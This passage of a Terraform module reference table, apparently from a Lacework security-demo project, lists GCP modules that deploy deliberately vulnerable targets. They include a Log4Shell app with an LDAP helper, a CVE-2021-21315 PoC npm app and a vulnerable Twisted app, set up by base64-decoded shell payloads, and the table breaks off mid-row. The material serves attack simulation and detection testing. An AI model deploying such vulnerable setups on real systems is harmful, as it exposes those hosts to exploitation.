                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-vulnerable-log4j-app                           | ./modules/osconfig/deploy-log4j-app                   | osconfig_deploy_log4j_app                       | context.gcp.osconfig.vulnerable.log4j_app                        | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "log4j_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                   | <pre>locals &&#35;123;<br/>    app&&#35;95;dir = &quot;/vuln&#45;log4j&#45;app&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;log4j&&#35;95;app&&#35;95;target&#46;log<br/>    <br/>    rm &#45;rf $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/>    mkdir $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/><br/>    log &quot;creating local files&#46;&#46;&#46;&quot;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;web&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; web&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;ldap&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip  &gt; ldap&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/><br/>    &#35; install java 8u131<br/>    log &quot;checking for jdk1&#46;8&#46;0&&#35;95;131&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#33; &#45;d /usr/java/jdk1&#46;8&#46;0&&#35;95;131/ &&#35;93;; then<br/>        log &quot;jdk1&#46;8&#46;0&&#35;95;131 not found &#45; installing&#46;&#46;&#46;&quot;<br/>        wget &#45;c &#45;&#45;header &quot;Cookie: oraclelicense=accept&#45;securebackup&#45;cookie&quot; http://download&#46;oracle&#46;com/otn&#45;pub/java/jdk/8u131&#45;b11/d54c1d3a095b4ff2b6607d096fa80163/jdk&#45;8u131&#45;linux&#45;x64&#46;tar&#46;gz<br/>        mkdir &#45;p /usr/java<br/>        sudo tar &#45;xvzf jdk&#45;8u131&#45;linux&#45;x64&#46;tar&#46;gz &#45;C /usr/java<br/>    else<br/>        log &quot;jdk1&#46;8&#46;0&&#35;95;131 found &#45; skipping install&quot;<br/>    fi<br/>    <br/><br/>    &#35; update java path<br/>    log &quot;setting up java environment for build&#46;&#46;&#46;&quot;<br/>    export JAVA&&#35;95;HOME=/usr/java/jdk1&#46;8&#46;0&&#35;95;131/<br/>    sudo update&#45;alternatives &#45;&#45;install /usr/bin/java java $$&&#35;123;JAVA&&#35;95;HOME%&&#35;42;/&&#35;125;/bin/java 20000<br/>    sudo update&#45;alternatives &#45;&#45;install /usr/bin/javac javac $$&&#35;123;JAVA&&#35;95;HOME%&&#35;42;/&&#35;125;/bin/javac 20000<br/>    <br/>    java &#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; download gradle 7&#46;3&#46;1<br/>    log &quot;checking for gradle 7&#46;3&#46;1&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#33; &#45;d /opt/gradle/gradle&#45;7&#46;3&#46;1 &&#35;93;; then<br/>        log &quot;gradle not found &#45; installing&#46;&#46;&#46;&quot;<br/>        wget https://services&#46;gradle&#46;org/distributions/gradle&#45;7&#46;3&#46;1&#45;bin&#46;zip<br/>        mkdir /opt/gradle<br/>        unzip &#45;d /opt/gradle gradle&#45;7&#46;3&#46;1&#45;bin&#46;zip<br/>    else<br/>        log &quot;gradle 7&#46;3&#46;1 found &#45; skipping install&quot; <br/>    fi<br/><br/>    &#35; update gradle path<br/>    log &quot;updating environment PATH to include gradle&#46;&#46;&#46;&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle&#45;7&#46;3&#46;1/bin<br/>    gradle &#45;&#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; clone the log4shell vulnerable app<br/>    log &quot;cloning https://github&#46;com/christophetd/log4shell&#45;vulnerable&#45;app&#46;&#46;&#46;&quot;<br/>    git clone https://github&#46;com/christophetd/log4shell&#45;vulnerable&#45;app<br/>    cd log4shell&#45;vulnerable&#45;app<br/>    log &quot;running gradle build&#46;&#46;&#46;&quot;<br/>    nohup gradle bootJar &#45;&#45;no&#45;daemon &amp;<br/>    GRADLE&&#35;95;PID=$&#33;<br/>    while kill &#45;0 $GRADLE&&#35;95;PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running&#46;&#46;&#46;&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete&#46;&quot;<br/>    <br/>    ls &#45;ltr build/libs/&&#35;42;&#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; copy java jar<br/>    log &quot;Copying java jar&#46;&#46;&quot;<br/>    cp build/libs/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    &#35; change to app root dir<br/>    cd $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        if pgrep &#45;f &quot;log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar&quot;; then<br/>            kill &#45;9 $&&#35;40;pgrep &#45;f &quot;log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar&quot;&&#35;41;<br/>        fi<br/>        screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;log4j&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;m java &#45;jar $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar &#45;&#45;server&#46;port=$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>        screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl unzip git&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl unzip git&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    web = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/web&#46;py&quot;,<br/>                        &&#35;41;<br/><br/>    ldap = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/ldap&#46;py&quot;,<br/>                        &&#35;41;<br/>    requirements = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                        &&#35;41;<br/>    <br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-vulnerable-npm-app                             | ./modules/osconfig/deploy-npm-app                     | osconfig_deploy_npm_app                         | context.gcp.osconfig.vulnerable.npm_app                          | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "npm_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                     | <pre>locals &&#35;123;<br/>    repo = &quot;https://github&#46;com/ForbiddenProgrammer/CVE&#45;2021&#45;21315&#45;PoC&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X quit<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;npm&&#35;95;app&&#35;95;target&#46;log<br/>    log &quot;checking for git&#46;&#46;&#46;&quot;<br/>    while &#33; command &#45;v git; do<br/>        log &quot;git not found &#45; waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $&&#35;40;command &#45;v  git&&#35;41;&quot;<br/>    rm &#45;rf /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    mkdir /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    cd /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    git clone $&&#35;123;local&#46;repo&&#35;125; &amp;&amp; &&#35;92;<br/>    cd CVE&#45;2021&#45;21315&#45;PoC &amp;&amp; &&#35;92;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;index&&#35;95;js&&#35;95;base64&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; index&#46;js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;npm&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;m npm start &#45;&#45;prefix /vuln&&#35;95;npm&&#35;95;app&&#35;95;target/CVE&#45;2021&#45;21315&#45;PoC<br/>        screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl nodejs npm&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl nodejs npm&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    index&&#35;95;js&&#35;95;base64 = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/index&#46;js&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;<br/>    <br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-vulnerable-python3-twisted-app                 | ./modules/osconfig/deploy-python3-twisted-app         | osconfig_deploy_python3_twisted_app             | context.gcp.osconfig.vulnerable.python3_twisted_app              | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "python3_twisted_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app         | <pre>locals &&#35;123;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target&#46;log<br/>    if command &#45;v $PACKAGE&&#35;95;MANAGER &amp;&amp; $PACKAGE&&#35;95;MANAGER list &#124; grep &quot;python3&#45;twisted&quot; &#124; grep &quot;18&#46;9&#46;0&#45;11ubuntu0&#46;20&#46;04&quot;; then<br/>        mkdir &#45;p /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app<br/>        cd /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;app&&#35;95;py&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; app&#46;py<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/>        log &quot;installing requirements&#46;&#46;&#46;&quot;<br/>        python3 &#45;m pip install &#45;r requirements&#46;txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X quit<br/>            screen &#45;wipe<br/>            screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;m python3 /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app/app&#46;py<br/>            screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url&#46;&#46;&#46;&quot;<br/>            while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>            sleep 1800<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3&#45;twisted/focal&#45;updates,focal&#45;security,now 18&#46;9&#46;0&#45;11ubuntu0&#46;20&#46;04&#46;1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl python3&#45;pip&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl python3&#45;pip&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    app&&#35;95;py = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;<br/>    requirements = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                &&#35;123;<br/>                &&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| attacker-vulnerable-cloudsql-app                        | ./modules/osconfig/deploy-cloudsql-app                | osconfig_deploy_cloudsql_app                    | context.gcp.osconfig.vulnerable.cloudsql_app                     | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "cloudsql_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8091<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-cloudsql-app                | <pre>locals &&#35;123;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    app&&#35;95;dirname = &quot;vuln&&#35;95;cloudsql&&#35;95;app&&#35;95;target&quot;<br/>    app&&#35;95;path = &quot;/$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/app&#46;py&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;cloudsql&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;cloudsql&&#35;95;app&&#35;95;target&#46;log<br/>    log &quot;removing previous app directory&quot;<br/>    rm &#45;rf /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;<br/>    log &quot;building app directory&quot;<br/>    mkdir &#45;p /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/templates<br/>    cd /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;app&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; app&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;test&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; test&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;get&&#35;95;cloudsql&&#35;95;cert&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; get&#45;cloudsql&#45;cert&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;database&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; bootstrap&#46;sql<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;entrypoint&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; entrypoint&#46;sh<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;index&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; templates/index&#46;html<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;cast&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; templates/cast&#46;html<br/>    <br/>    log &quot;updating entrypoing permissions&quot;<br/>    chmod 755 entrypoint&#46;sh<br/><br/>    log &quot;installing requirements&#46;&#46;&#46;&quot;<br/>    python3 &#45;m pip install &#45;r requirements&#46;txt &gt;&gt; $LOGFILE 